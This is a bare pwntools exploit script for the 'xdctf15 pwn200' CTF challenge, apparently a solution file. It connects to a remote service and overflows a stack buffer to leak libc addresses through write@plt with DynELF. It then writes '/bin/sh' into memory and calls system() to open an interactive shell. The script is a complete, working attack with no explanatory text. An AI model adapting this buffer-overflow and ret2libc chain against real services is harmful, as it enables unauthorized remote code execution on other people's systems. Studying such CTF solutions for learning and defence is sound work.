from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux')
#context.log_level = 'debug'
#io = process('./xdctf15 pwn200')
io = remote('192.168.95.146',10000)
length = 0x6c
elf = ELF('./xdctf15 pwn200')
write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
bin_sh = 0x804a100
main = 0x080484BE

def leak(address):
    io.recv()
    payload = 'a'*0x6c+'aaaa'+p32(write_plt)+p32(main)+p32(1)+p32(address)+p32(4)
    io.send(payload)
    data = io.recv(4)
    log.info('%#x => %s' % (address, hex(u32((data or '')))))
    return data

def write(address,string):
    payload = 'a'*0x6c+'aaaa'+p32(read_plt)+p32(main)+p32(0)+p32(address)+p32(len(string))
    io.send(payload)
    io.send(string)

def getshell(address,bin_sh):
    payload = 'a'*0x6c+'aaaa'+p32(address)+p32(0)+p32(bin_sh)
    io.send(payload)
    io.interactive()
d = DynELF(leak,elf=elf)
sys_addr = d.lookup('system','libc')
libc_base = d.lookup(None,'libc')
print hex(sys_addr)

#gdb.attach(io,'b *0x080484BC')
#raw_input()
write(bin_sh,'/bin/sh\x00')
print hex(bin_sh)
getshell(sys_addr,bin_sh)
